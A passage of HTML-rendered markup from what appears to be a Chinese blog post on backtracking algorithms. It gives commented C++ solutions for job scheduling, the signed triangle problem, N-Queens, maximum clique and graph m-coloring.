idx<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 全排列搜索</span>f1 <span class="token operator">+=</span> jobs<span class="token punctuation">[</span>curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>f2<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f2<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">></span> f1<span class="token punctuation">)</span> <span class="token operator">?</span> f2<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">:</span> f1<span class="token punctuation">)</span> <span class="token operator">+</span> jobs<span class="token punctuation">[</span>curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>curSum <span class="token operator">+=</span> f2<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>curSum <span class="token operator">&lt;</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 剪枝（若当前累计和已经大于等于最优解，则不继续向下搜索）</span><span class="token function">swap</span><span class="token punctuation">(</span>curSche<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">swap</span><span class="token punctuation">(</span>curSche<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 回溯</span>f1 <span class="token operator">-=</span> jobs<span class="token punctuation">[</span>curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>curSum <span class="token operator">-=</span> f2<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 递归搜索</span><span class="token comment">// 打印最优调度方案</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> optimSche<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> cout <span class="token operator">&lt;&lt;</span> <span class="token string">"->"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="符号三角形问题"><a href="#符号三角形问题" class="headerlink" title="符号三角形问题"></a>符号三角形问题</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/signed.png"></p><h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">signedTriangle</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> num <span class="token operator">=</span> n <span class="token operator">*</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// 三角形符号总数</span><span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 总数为奇数，不可能相等</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">triangles</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false代表'+',true代表'-'</span><span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 合法图形个数</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">>></span> fullShape<span class="token punctuation">;</span> <span class="token comment">// 所有合法图形</span><span class="token comment">// 递归搜索函数</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 到达最大搜索深度，判断是否可行</span><span class="token keyword">int</span> pCnt <span class="token operator">=</span> num <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> sCnt <span class="token operator">=</span> num <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// 剩余'+','-'的符号个数</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> newShape<span class="token punctuation">;</span> <span class="token comment">// 当前图形</span>queue<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> q<span class="token punctuation">,</span> nq<span class="token punctuation">;</span> <span class="token comment">// 轮换队列</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 将第一行符号加入队列</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>triangles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newShape<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>triangles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token punctuation">(</span>triangles<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">?</span> sCnt <span class="token operator">:</span> pCnt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">bool</span> ft <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">bool</span> nt <span class="token operator">=</span> ft <span class="token operator">^</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 队列前两个符号异或得到下面的符号</span>nq<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>nt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token punctuation">(</span>nt <span class="token operator">?</span> sCnt <span class="token operator">:</span> pCnt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sCnt <span class="token operator">*</span> pCnt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 其中一个符号个数超过一半</span>newShape<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>nt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>q <span class="token operator">=</span> <span class="token function">move</span><span class="token punctuation">(</span>nq<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 队列轮换（利用右值引用进行资源所有权的交换）</span><span class="token punctuation">&#125;</span><span class="token comment">// 该结果合法</span><span class="token operator">++</span>res<span class="token punctuation">;</span>fullShape<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>newShape<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>triangles<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>triangles<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 递归搜索</span><span class="token comment">// 打印所有合法图形</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> shape <span class="token operator">:</span> fullShape<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> col <span class="token operator">=</span> n<span class="token punctuation">;</span> col <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">--</span>col<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> di <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> col<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> col <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> col<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> shape<span class="token punctuation">[</span>i <span class="token operator">+</span> di<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="N皇后"><a href="#N皇后" class="headerlink" title="N皇后"></a>N皇后</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/nq.png"></p><h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> <span class="token function">solveNQueens</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> res<span class="token punctuation">;</span> <span class="token comment">// 存放所有解</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">chessBoard</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 当前棋盘状态</span>    <span class="token comment">// 检查该位置(r,c)是否能够放置棋子</span>    <span class="token keyword">auto</span> check <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 从上往下依次检查棋盘第c列是否已放置棋子</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>chessBoard<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Q'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// 从下往上依次检查左斜上方是否已放置棋子</span>            <span class="token keyword">int</span> li <span class="token operator">=</span> r <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> lj <span class="token operator">=</span> c <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>li <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> lj <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> chessBoard<span class="token punctuation">[</span>li<span class="token punctuation">]</span><span class="token punctuation">[</span>lj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Q'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// 从下往上依次检查右斜上方是否已放置棋子</span>            <span class="token keyword">int</span> ri <span class="token operator">=</span> r <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> rj <span class="token operator">=</span> c <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ri <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> rj <span class="token operator">&lt;</span> n <span class="token operator">&amp;&amp;</span> chessBoard<span class="token punctuation">[</span>ri<span class="token punctuation">]</span><span class="token punctuation">[</span>rj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Q'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 递归搜索函数</span>    function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 到达最大深度，得到一个合法解</span>            res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token comment">// 当前位置不可放置</span>            chessBoard<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Q'</span><span class="token punctuation">;</span> <span class="token comment">// 放置棋子</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            chessBoard<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span> <span class="token comment">// 回溯</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="最大团问题"><a href="#最大团问题" class="headerlink" title="最大团问题"></a>最大团问题</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/group.png"></p><h2 id="解题代码-4"><a href="#解题代码-4" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 图的邻接矩阵形式</span><span class="token keyword">struct</span> <span class="token class-name">MGraph</span> <span class="token punctuation">&#123;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> vertices<span class="token punctuation">;</span> <span class="token comment">// 顶点数组（元素为字符类型）</span><span class="token comment">// 邻接矩阵，edges[u][v] == INT32_MAX ? 无边 : 存在权值为edges[u][v]的边</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> edges<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span> <span class="token function">largestGroup</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 顶点个数</span> <span class="token comment">// 所有的最大团（每个最大团为一个char类型数组，其中元素为最大团顶点）</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span> res<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">curGroup</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 当前团</span><span class="token keyword">int</span> maxSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 团的最大顶点数</span><span class="token comment">// 递归搜索函数，idx为搜索深度，curSize为当前搜索状态下团的顶点个数</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> curSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 到达最大搜索深度</span><span class="token comment">// 构造最大团</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> group<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>curGroup<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>group<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 更新最优解</span><span class="token keyword">if</span> <span class="token punctuation">(</span>curSize <span class="token operator">></span> maxSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>maxSize <span class="token operator">=</span> curSize<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 判断当前结点idx是否能够与当前团的每个结点相连</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> idx<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>curGroup<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> INT32_MAX<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 如果相连，则构成一个更大的团，继续向下搜索</span>curGroup<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 加入团</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> curSize <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>curGroup<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 回溯</span><span class="token punctuation">&#125;</span><span class="token comment">// 剪枝，若满足curSize + n - idx &lt;= maxSize</span><span class="token comment">// 则不可能得到比当前最大团更大的团，无需继续搜索</span><span class="token keyword">if</span> <span class="token punctuation">(</span>curSize <span class="token operator">+</span> n <span class="token operator">-</span> idx <span class="token operator">></span> maxSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> curSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="图的m着色问题"><a href="#图的m着色问题" class="headerlink" title="图的m着色问题"></a>图的m着色问题</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/m.png"></p><h2 id="解题代码-5"><a href="#解题代码-5" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 图的邻接矩阵形式</span><span class="token keyword">struct</span> <span class="token class-name">MGraph</span> <span class="token punctuation">&#123;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> vertices<span class="token punctuation">;</span> <span class="token comment">// 顶点数组（元素为字符类型）</span><span class="token comment">// 邻接矩阵，edges[u][v] == INT32_MAX ? 无边 : 存在权值为edges[u][v]的边</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> edges<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">mColoring</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 图的顶点个数</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> res<span class="token punctuation">;</span> <span class="token comment">// 所有着色方案，若无合法着色方案，则为空</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">coloring</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 当前着色方案</span><span class="token 